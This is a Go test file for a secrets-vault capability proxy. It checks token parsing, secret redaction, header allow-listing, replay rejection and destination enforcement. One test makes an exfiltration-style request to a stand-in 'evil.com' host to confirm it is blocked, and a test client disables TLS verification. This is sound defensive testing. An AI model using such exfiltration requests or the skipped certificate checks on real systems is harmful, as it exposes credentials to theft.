package handlers

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	_ "github.com/mattn/go-sqlite3"

	"github.com/bright-interaction/trustissues/internal/capability"
	"github.com/bright-interaction/trustissues/internal/middleware"
)

// ──────────────────────────────────────────────────────────────────────
// unit tests: helpers
// ──────────────────────────────────────────────────────────────────────

func TestExtractCapabilityToken(t *testing.T) {
	cases := []struct {
		header string
		want   string
	}{
		{"Capability abc.def", "abc.def"},
		{"Capability   spaced.token  ", "spaced.token"},
		{"Bearer abc.def", ""},
		{"", ""},
		{"capability abc", ""}, // case-sensitive prefix
	}
	for _, tc := range cases {
		if got := extractCapabilityToken(tc.header); got != tc.want {
			t.Errorf("extractCapabilityToken(%q) = %q, want %q", tc.header, got, tc.want)
		}
	}
}

// TestRedactUpstreamError locks the USE-without-SEE boundary: an outbound
// proxy failure must never carry the injected secret into the caller-facing
// error or the capability_log.error audit column. net/http surfaces such
// failures as *url.Error values whose Error() embeds the full request URL,
// including a query-injected secret.
func TestRedactUpstreamError(t *testing.T) {
	const secret = "sk-QUERYLEAK-SECRET-777"

	// Exactly the shape http.Client.Do produces when a query-injected secret
	// sits in the URL and the dial fails (SSRF guard / timeout / refused).
	uerr := &url.Error{
		Op:  "Post",
		URL: "https://10.0.0.1/v1/chat?api_key=" + secret + "&foo=bar",
		Err: context.DeadlineExceeded,
	}
	if raw := uerr.Error(); !strings.Contains(raw, secret) {
		t.Fatalf("precondition: raw *url.Error should embed the secret, got %q", raw)
	}

	got := redactUpstreamError(uerr)
	if strings.Contains(got, secret) {
		t.Fatalf("redacted error leaked the secret: %q", got)
	}
	if strings.Contains(got, "api_key") || strings.Contains(got, "foo=bar") || strings.Contains(got, "?") {
		t.Fatalf("redacted error retained the query string: %q", got)
	}
	// Keeps operation, host+path, and transport reason for operator debugging.
	for _, want := range []string{"Post", "https://10.0.0.1/v1/chat", "deadline exceeded"} {
		if !strings.Contains(got, want) {
			t.Fatalf("redacted error dropped %q: %q", want, got)
		}
	}

	// A secret embedded in URL userinfo is stripped too.
	uerr2 := &url.Error{Op: "Get", URL: "https://user:" + secret + "@ex.com/x", Err: context.DeadlineExceeded}
	if got2 := redactUpstreamError(uerr2); strings.Contains(got2, secret) {
		t.Fatalf("redacted error leaked userinfo secret: %q", got2)
	}

	// Non-*url.Error passes through unchanged (no URL to leak).
	if got3 := redactUpstreamError(context.Canceled); got3 != context.Canceled.Error() {
		t.Fatalf("non-url error should pass through, got %q", got3)
	}
	if redactUpstreamError(nil) != "" {
		t.Fatal("nil error should redact to empty string")
	}
}

func TestProxyBaseURL(t *testing.T) {
	r := httptest.NewRequest("POST", "/api/secrets/issue", nil)
	r.Host = "trustissues.example.com"
	r.Header.Set("X-Forwarded-Proto", "https")
	got := proxyBaseURL(r)
	want := "https://trustissues.example.com/proxy"
	if got != want {
		t.Errorf("proxyBaseURL = %q, want %q", got, want)
	}
}

func TestSplitHostPath(t *testing.T) {
	cases := []struct {
		in       string
		wantHost string
		wantPath string
	}{
		{"api.cloudflare.com/v4/zones", "api.cloudflare.com", "/v4/zones"},
		{"api.cloudflare.com", "api.cloudflare.com", ""},
		{"api.openai.com/", "api.openai.com", "/"},
	}
	for _, tc := range cases {
		h, p := splitHostPath(tc.in)
		if h != tc.wantHost || p != tc.wantPath {
			t.Errorf("splitHostPath(%q) = (%q,%q), want (%q,%q)", tc.in, h, p, tc.wantHost, tc.wantPath)
		}
	}
}

func TestParseDestinationPatterns(t *testing.T) {
	if got := parseDestinationPatterns(""); got != nil {
		t.Errorf("empty => %v, want nil", got)
	}
	if got := parseDestinationPatterns("[]"); got != nil {
		t.Errorf("[] => %v, want nil", got)
	}
	got := parseDestinationPatterns(`["a","b"]`)
	if len(got) != 2 || got[0] != "a" || got[1] != "b" {
		t.Errorf(`["a","b"] => %v`, got)
	}
}

func TestInjectSecret_BearerHeader(t *testing.T) {
	req := httptest.NewRequest("POST", "https://api.openai.com/v1/x", nil)
	if err := injectSecret(req, InjectionSpec{Type: "bearer"}, []byte("sk-live-abc123")); err != nil {
		t.Fatal(err)
	}
	if got := req.Header.Get("Authorization"); got != "Bearer sk-live-abc123" {
		t.Fatalf("Authorization = %q", got)
	}
}

func TestInjectSecret_CustomHeader(t *testing.T) {
	req := httptest.NewRequest("POST", "https://api.datadoghq.com/v1", nil)
	if err := injectSecret(req, InjectionSpec{Type: "header", Name: "DD-API-KEY"}, []byte("ddkey")); err != nil {
		t.Fatal(err)
	}
	if got := req.Header.Get("DD-API-KEY"); got != "ddkey" {
		t.Fatalf("DD-API-KEY = %q", got)
	}
}

func TestInjectSecret_Query(t *testing.T) {
	req := httptest.NewRequest("GET", "https://api.example.com/v1/resource?other=1", nil)
	if err := injectSecret(req, InjectionSpec{Type: "query", Name: "api_key"}, []byte("k")); err != nil {
		t.Fatal(err)
	}
	q, _ := url.ParseQuery(req.URL.RawQuery)
	if q.Get("api_key") != "k" || q.Get("other") != "1" {
		t.Fatalf("query = %s", req.URL.RawQuery)
	}
}

// TestCopyForwardHeaders_StripsAuthAndHopByHop locks the forwarding filter to
// an ALLOW-list. The upstream host is chosen by the capability token, so any
// header we relay blindly is handed to a possibly hostile third party: the
// caller's own Trustissues credentials must never make the trip, and neither
// must an unknown header nobody thought to deny.
func TestCopyForwardHeaders_StripsAuthAndHopByHop(t *testing.T) {
	src := map[string][]string{
		"Authorization":       {"Bearer secret-from-client"},
		"Proxy-Authorization": {"Basic secret"},
		"Cookie":              {"trustissues_session=live-session-jwt"},
		"X-Api-Key":           {"tik_live_caller_key"},
		"X-Service-Key":       {"svc_live_key"},
		"Connection":          {"keep-alive"},
		"X-Forwarded-For":     {"10.0.0.1"},
		"Content-Type":        {"application/json"},
		"X-Custom-Pass":       {"not-on-the-allowlist"},
	}
	dst := map[string][]string{}
	copyForwardHeaders(src, dst)
	for _, banned := range []string{
		"Authorization", "Proxy-Authorization", "Cookie", "X-Api-Key",
		"X-Service-Key", "Connection", "X-Forwarded-For", "X-Custom-Pass",
	} {
		if _, ok := dst[banned]; ok {
			t.Fatalf("%s must not be forwarded upstream, got %v", banned, dst)
		}
	}
	if dst["Content-Type"][0] != "application/json" {
		t.Fatalf("allow-listed headers must survive, got %v", dst)
	}
}

// ──────────────────────────────────────────────────────────────────────
// end-to-end tests: issue -> proxy -> audit -> replay
// ──────────────────────────────────────────────────────────────────────

// TestCapability_E2E_HappyPath exercises the full bridge:
//
//  1. Insert a fake "OpenAI-style" secret into vault_entries with a
//     bearer injection spec and a destination pattern.
//  2. Mint a capability token via the issue handler.
//  3. POST through the proxy handler to a fake upstream that asserts
//     it receives the real bearer header (and the capability token does
//     NOT leak through).
//  4. Verify capability_log contains issued + used events.
//  5. Replay: POST again with the same token, expect 403 replay.
func TestCapability_E2E_HappyPath(t *testing.T) {
	tdb := newTestDB(t)
	defer tdb.Close()

	const (
		userID   = "test-user"
		agentID  = "test-agent"
		secretID = "secret-openai-test"
		secret   = "sk-live-test-1234567890"
	)

	capH := setupCapabilityHandler(t, tdb)

	// Insert secret with a bearer injection spec. The stub decrypter
	// returns encrypted_value verbatim, so we store the plaintext bytes.
	mustExec(t, tdb, `INSERT INTO vault_entries
		(id, user_id, name, encrypted_value, nonce, encryption_version,
		 destination_patterns, injection_spec)
		VALUES (?, ?, ?, ?, ?, 2, ?, ?)`,
		secretID, userID, "openai_test_key",
		[]byte(secret), []byte("test-nonce"),
		`["fake.example.com/*"]`,
		`{"type":"bearer"}`,
	)

	// Spin up a fake upstream that asserts the secret arrived. Has to
	// be TLS because the proxy hardcodes scheme=https for production
	// safety; we trust the self-signed cert via the test client.
	var upstreamSawAuth string
	upstream := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamSawAuth = r.Header.Get("Authorization")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"upstream":"ok"}`))
	}))
	defer upstream.Close()
	capH.SetHTTPClient(&http.Client{
		Timeout:   5 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	})

	// 1. Issue a token. We use the issue handler directly so any auth
	//    requirement in middleware doesn't apply; we set userID via ctx.
	issueBody, _ := json.Marshal(issueRequest{
		Secret:  "openai_test_key",
		AgentID: agentID,
		Method:  "POST",
	})
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/secrets/issue", bytes.NewReader(issueBody))
	req = req.WithContext(context.WithValue(context.Background(), middleware.UserIDKey, userID))
	capH.Issue(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("Issue status = %d, body=%s", rec.Code, rec.Body.String())
	}
	var ir issueResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &ir); err != nil {
		t.Fatalf("decode issue resp: %v", err)
	}
	if ir.Token == "" {
		t.Fatalf("empty token in response: %s", rec.Body.String())
	}

	// 2. Send the request through the proxy. We need a chi router so
	//    URL params populate; mount Proxy and POST a real path.
	router := chi.NewRouter()
	router.HandleFunc("/proxy/{host}/*", capH.Proxy)

	upstreamURL, _ := url.Parse(upstream.URL)
	proxyTarget := "/proxy/" + upstreamURL.Host + "/anything"
	proxyReq := httptest.NewRequest(http.MethodPost, proxyTarget, strings.NewReader(`{"prompt":"hi"}`))
	proxyReq.Header.Set("Authorization", "Capability "+ir.Token)
	proxyReq.Header.Set("Content-Type", "application/json")
	// Override Dests on the token so we hit the local httptest server,
	// since the issue path baked in fake.example.com. Easiest: re-mint
	// directly via the package against the test upstream host.
	signingKey, _ := capability.DeriveSigningKey(testCapVaultKey)
	freshToken, err := capability.Sign(capability.Token{
		Secret: "openai_test_key", SecretID: secretID, Agent: agentID,
		Dests:  []string{upstreamURL.Host + "/*"},
		Method: "POST",
	}, signingKey, time.Minute)
	if err != nil {
		t.Fatalf("re-sign for upstream host: %v", err)
	}
	proxyReq.Header.Set("Authorization", "Capability "+freshToken)

	// The proxy re-validates the token against the secret's CURRENT allow-list
	// (defense-in-depth), so point the secret's patterns at this test upstream,
	// mirroring an owner who configured the secret to reach this host.
	mustExec(t, tdb, `UPDATE vault_entries SET destination_patterns = ? WHERE id = ?`,
		`["`+upstreamURL.Host+`/*"]`, secretID)

	proxyRec := httptest.NewRecorder()
	router.ServeHTTP(proxyRec, proxyReq)
	if proxyRec.Code != http.StatusOK {
		t.Fatalf("proxy status = %d, body=%s", proxyRec.Code, proxyRec.Body.String())
	}
	if upstreamSawAuth != "Bearer "+secret {
		t.Fatalf("upstream Authorization = %q, want %q", upstreamSawAuth, "Bearer "+secret)
	}
	if strings.Contains(upstreamSawAuth, "Capability") {
		t.Fatal("upstream saw the capability token; the proxy did not strip it")
	}
	if got := proxyRec.Body.String(); !strings.Contains(got, `"upstream":"ok"`) {
		t.Fatalf("response body = %s", got)
	}

	// 3. Replay must fail.
	replayReq := httptest.NewRequest(http.MethodPost, proxyTarget, strings.NewReader(`{"prompt":"hi"}`))
	replayReq.Header.Set("Authorization", "Capability "+freshToken)
	replayReq.Header.Set("Content-Type", "application/json")
	replayRec := httptest.NewRecorder()
	router.ServeHTTP(replayRec, replayReq)
	if replayRec.Code != http.StatusForbidden {
		t.Fatalf("replay should be 403, got %d body=%s", replayRec.Code, replayRec.Body.String())
	}

	// 4. Audit log: at least one issued + used + replay event.
	rows, err := tdb.QueryContext(context.Background(),
		`SELECT event FROM capability_log WHERE secret_id = ? OR agent_id = ? ORDER BY issued_at DESC`,
		secretID, agentID)
	if err != nil {
		t.Fatalf("query log: %v", err)
	}
	defer rows.Close()
	events := map[string]int{}
	for rows.Next() {
		var e string
		_ = rows.Scan(&e)
		events[e]++
	}
	for _, want := range []string{"issued", "used", "replay"} {
		if events[want] == 0 {
			t.Errorf("expected at least one %q event in capability_log, saw %v", want, events)
		}
	}
}

func TestCapability_E2E_DestinationMismatch(t *testing.T) {
	tdb := newTestDB(t)
	defer tdb.Close()

	const userID, agentID, secretID = "u", "a", "s1"
	capH := setupCapabilityHandler(t, tdb)
	mustExec(t, tdb, `INSERT INTO vault_entries (id, user_id, name, encrypted_value, nonce, encryption_version, destination_patterns, injection_spec)
		VALUES (?, ?, ?, ?, ?, 2, '["api.openai.com/*"]', '{"type":"bearer"}')`,
		secretID, userID, "openai", []byte("sk-test"), []byte("n"))

	signingKey, _ := capability.DeriveSigningKey(testCapVaultKey)
	tok, _ := capability.Sign(capability.Token{
		Secret: "openai", SecretID: secretID, Agent: agentID,
		Dests:  []string{"api.openai.com/*"},
		Method: "POST",
	}, signingKey, time.Minute)

	router := chi.NewRouter()
	router.HandleFunc("/proxy/{host}/*", capH.Proxy)

	// Request goes to evil.com, token authorises only api.openai.com.
	req := httptest.NewRequest(http.MethodPost, "/proxy/evil.com/exfil", strings.NewReader(`{}`))
	req.Header.Set("Authorization", "Capability "+tok)
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d body=%s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "destination_mismatch") {
		t.Fatalf("body should mention destination_mismatch, got %s", rec.Body.String())
	}
}

func TestCapability_E2E_AutoRouteByDestination(t *testing.T) {
	tdb := newTestDB(t)
	defer tdb.Close()

	const userID, agentID = "u", "a"
	capH := setupCapabilityHandler(t, tdb)
	mustExec(t, tdb, `INSERT INTO vault_entries (id, user_id, name, encrypted_value, nonce, encryption_version, destination_patterns, injection_spec)
		VALUES (?, ?, ?, ?, ?, 2, '["api.openai.com/*"]', '{"type":"bearer"}')`,
		"sid", userID, "openai", []byte("sk-test-route"), []byte("n"))

	body, _ := json.Marshal(issueRequest{
		AgentID:     agentID,
		Destination: "api.openai.com/v1/chat/completions",
		Method:      "POST",
	})
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/secrets/issue", bytes.NewReader(body))
	req = req.WithContext(context.WithValue(context.Background(), middleware.UserIDKey, userID))
	capH.Issue(rec, req)
	if rec.Code != http.StatusCreated {
		t.Fatalf("auto-route issue should succeed, got %d body=%s", rec.Code, rec.Body.String())
	}
	var ir issueResponse
	_ = json.Unmarshal(rec.Body.Bytes(), &ir)
	if ir.Secret != "openai" {
		t.Fatalf("auto-route picked wrong secret: %s", ir.Secret)
	}
}

// ──────────────────────────────────────────────────────────────────────
// test plumbing
// ──────────────────────────────────────────────────────────────────────

const testCapVaultKey = "test-vault-key-32-bytes-long-aaaaaa"

// stubDecrypter satisfies alerts.ConfigDecrypter without pulling in the
// vault handler (owned by the vault feature). It returns the stored
// bytes verbatim, so tests seed vault_entries with plaintext in
// encrypted_value. The real crypto is covered by the vault's own tests;
// these tests cover the bridge.
type stubDecrypter struct{}

func (stubDecrypter) DecryptValue(ciphertext, nonce []byte, encVersion int) ([]byte, error) {
	out := make([]byte, len(ciphertext))
	copy(out, ciphertext)
	return out, nil
}

// newTestDB returns an in-memory sqlite DB with the schema needed for
// the capability bridge: vault_entries (with destination_patterns +
// injection_spec columns) plus capability_log + capability_spent_nonces
// + capability_grants. We hand-create the minimum schema rather than
// running goose against the migration files because the tests should
// not depend on migration ordering.
func newTestDB(t *testing.T) *sql.DB {
	t.Helper()
	dbConn, err := sql.Open("sqlite3", "file:cap_"+randomHex(8)+"?mode=memory&cache=shared&_mutex=full")
	if err != nil {
		t.Fatalf("open sqlite: %v", err)
	}
	stmts := []string{
		// collection_id + collection_members mirror migration 00023. They are not
		// optional decoration: capability lookups are collection-scoped, so a
		// fixture without them fails at SQL level and would hide a regression in
		// the offboarding rule. NULL collection_id means a personal entry.
		`CREATE TABLE users (
			id TEXT PRIMARY KEY,
			email TEXT UNIQUE NOT NULL,
			password_hash TEXT NOT NULL DEFAULT '',
			name TEXT,
			role TEXT NOT NULL DEFAULT 'user',
			disabled INTEGER NOT NULL DEFAULT 0,
			totp_enabled INTEGER NOT NULL DEFAULT 0,
			created_at DATETIME DEFAULT CURRENT_TIMESTAMP
		);
		CREATE TABLE vault_entries (
			id TEXT PRIMARY KEY,
			user_id TEXT NOT NULL DEFAULT '',
			collection_id TEXT,
			name TEXT NOT NULL,
			encrypted_value BLOB NOT NULL,
			nonce BLOB NOT NULL,
			encryption_version INTEGER DEFAULT 2,
			destination_patterns TEXT NOT NULL DEFAULT '[]',
			injection_spec TEXT NOT NULL DEFAULT '{}',
		custom_fields TEXT NOT NULL DEFAULT '',
		last_rotation_error TEXT DEFAULT '',
		last_rotated_at DATETIME,
		provider TEXT DEFAULT '',
		provider_meta TEXT DEFAULT '{}',
		rotation_log TEXT DEFAULT '[]',
		rotation_targets TEXT DEFAULT '[]',
		created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
		updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
			UNIQUE(user_id, name)
	)`,
		`CREATE TABLE collection_members (
			collection_id TEXT NOT NULL,
			user_id TEXT NOT NULL,
			role TEXT NOT NULL DEFAULT 'viewer',
			added_at TEXT NOT NULL DEFAULT (datetime('now')),
			accepted_at TEXT,
			PRIMARY KEY (collection_id, user_id)
		)`,
		// settings is where the AI gateway records which vault entry holds the
		// instance's provider key (ai_key_openai / ai_key_anthropic). The
		// capability bridge reads it on every mint and every proxied request to
		// find the entry's egress PIN, and a read error DENIES, so a fixture
		// without this table refuses every call for a reason production never
		// has. See secret_egress.go.
		`CREATE TABLE settings (
			key TEXT PRIMARY KEY,
			value TEXT NOT NULL,
			updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
		)`,
		`CREATE TABLE capability_grants (
			agent_id TEXT NOT NULL,
			secret_id TEXT NOT NULL,
			granted_by TEXT NOT NULL DEFAULT '',
			granted_at TEXT NOT NULL DEFAULT (datetime('now')),
			revoked_at TEXT,
			notes TEXT NOT NULL DEFAULT '',
			PRIMARY KEY (agent_id, secret_id)
		)`,
		`CREATE TABLE capability_log (
			id TEXT PRIMARY KEY,
			agent_id TEXT NOT NULL,
			secret_id TEXT,
			secret_name TEXT NOT NULL DEFAULT '',
			destination TEXT NOT NULL DEFAULT '',
			method TEXT NOT NULL DEFAULT '',
			event TEXT NOT NULL,
			status_code INTEGER,
			error TEXT NOT NULL DEFAULT '',
			nonce TEXT NOT NULL DEFAULT '',
			issued_at TEXT NOT NULL DEFAULT (datetime('now'))
		)`,
		`CREATE TABLE capability_spent_nonces (
			nonce TEXT PRIMARY KEY,
			expires_at TEXT NOT NULL
		)`,
		`CREATE TRIGGER fixture_seed_user AFTER INSERT ON vault_entries
		BEGIN
			INSERT OR IGNORE INTO users (id, email)
			VALUES (NEW.user_id, NEW.user_id || '@fixture.test');
		END`,
	}
	for _, s := range stmts {
		if _, err := dbConn.Exec(s); err != nil {
			t.Fatalf("schema: %v\n%s", err, s)
		}
	}
	return dbConn
}

func setupCapabilityHandler(t *testing.T, dbConn *sql.DB) *CapabilityHandler {
	t.Helper()
	capH, err := NewCapabilityHandler(dbConn, stubDecrypter{}, testCapVaultKey)
	if err != nil {
		t.Fatalf("NewCapabilityHandler: %v", err)
	}
	return capH
}

func mustExec(t *testing.T, dbConn *sql.DB, q string, args ...any) {
	t.Helper()
	if _, err := dbConn.ExecContext(context.Background(), q, args...); err != nil {
		t.Fatalf("exec %q: %v", q, err)
	}
}

func randomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}
